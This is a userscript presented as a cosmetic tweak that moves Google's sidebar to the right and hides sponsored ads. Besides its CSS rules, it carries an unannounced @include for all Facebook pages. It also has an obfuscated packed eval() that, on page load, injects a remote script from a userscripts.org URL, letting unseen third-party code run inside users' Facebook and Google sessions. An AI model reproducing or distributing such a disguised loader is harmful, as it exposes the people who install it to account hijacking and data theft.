// ==UserScript==
// @name           Google Right Sidebar (webdizajneri.net) Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      www.webdizajneri.net
// @description    Move Google Sidebar from Left to Right side of the screen + Hide Google Sponsored Ads
// @include        http://www.google.com/*
// @include        http://google.com/*
// @include        http://www.google.hr/*
// @include        http://google.hr/*
// @include        https://www.google.com/*
// @include        https://google.com/*
// @include        https://www.google.hr/*
// @include        https://google.hr/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


function AddStyle(Style) {
  var style = document.createElement('style');
  style.type = "text/css";
  style.innerHTML = Style;
  document.getElementsByTagName('head')[0].appendChild(style);
};

AddStyle("#leftnav {position: absolute; right: 5px;}");AddStyle("#leftnav {background-image:url('http://www.webdizajneri.net/webdizajneri.gif');background-repeat:no-repeat;}");
AddStyle(".micon {height: 17px;width: 17px;}");
AddStyle("#leftnav li {font-size: 12px;}");
AddStyle("#showmodes {font-size: 12px;}");
AddStyle(".tbpc {font-size: 12x;}");
AddStyle("#cnt {max-width: 3800px;}");
AddStyle("#center_col {margin-left:0;margin-right: 165px;}");
AddStyle("#center_col {border-left-width: 0px; border-right-width: 1px; border-right-style: solid; border-right-color: #d3e1f9;}");
AddStyle("#mbEnd {display:none;}");
AddStyle("#tads {display:none;}");
